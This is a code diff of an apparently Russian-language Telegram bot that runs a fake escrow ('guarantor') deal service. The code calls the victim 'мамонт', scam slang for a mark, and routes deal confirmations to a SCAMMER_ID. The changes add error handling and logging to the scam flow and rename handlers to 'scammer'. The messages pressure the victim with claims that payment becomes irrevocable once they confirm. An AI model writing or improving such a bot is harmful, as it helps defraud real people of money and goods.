@@ -988,29 +988,33 @@ async def confirm_deal(callback: CallbackQuery, state: FSMContext):
         except Exception as e:
             logger.error(f"Не удалось отправить сообщение мамонту: {e}")
 
-    await callback.bot.send_message(
-        SCAMMER_ID,
-        f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
-        f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
-        f"<b>Описание:</b> {deal[5]}\n"
-        f"<b>Комиссия:</b> {COMMISSION}%\n\n"
-        f"<b>Статус сделки: покупатель оплатил, продавец подтвердил передачу товара</b>\n\n"
-        f"<b>Проверьте передачу товара на {SUPPORT_USERNAME} и подтвердите это в системе бота.</b>\n"
-        f"<b>После подтверждения оплата будет безвозвратно отправлена продавцу, а товар — отправлен вам!</b>",
-        reply_markup=deal_status_buttons(deal_code, is_seller=True)
-    )
+    try:
+        await callback.bot.send_message(
+            SCAMMER_ID,
+            f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
+            f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
+            f"<b>Описание:</b> {deal[5]}\n"
+            f"<b>Комиссия:</b> {COMMISSION}%\n\n"
+            f"<b>Статус сделки: покупатель оплатил, продавец подтвердил передачу товара</b>\n\n"
+            f"<b>Проверьте передачу товара на {SUPPORT_USERNAME} и подтвердите это в системе бота.</b>\n"
+            f"<b>После подтверждения оплата будет безвозвратно отправлена продавцу, а товар — отправлен вам!</b>",
+            reply_markup=deal_status_buttons(deal_code, is_scammer=True)
+        )
+        logger.info(f"Сообщение отправлено скамеру (SCAMMER_ID={SCAMMER_ID})")
+    except Exception as e:
+        logger.error(f"Не удалось отправить сообщение скамеру: {e}")
 
-    await callback.answer("✅ Передача подтверждена!")
+    await callback.answer("✅ Передача подтверждена! Ожидайте подтверждения от скамера.")
 
-@router.callback_query(F.data.startswith("confirm_deal_seller_"))
-async def confirm_deal_seller(callback: CallbackQuery, state: FSMContext):
+@router.callback_query(F.data.startswith("confirm_deal_scammer_"))
+async def confirm_deal_scammer(callback: CallbackQuery, state: FSMContext):
     if not is_admin(callback.from_user.id):
         await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
         return
 
     await state.clear()
 
-    deal_code = callback.data.replace("confirm_deal_seller_", "")
+    deal_code = callback.data.replace("confirm_deal_scammer_", "")
     deal = get_deal(deal_code)
 
     if not deal:
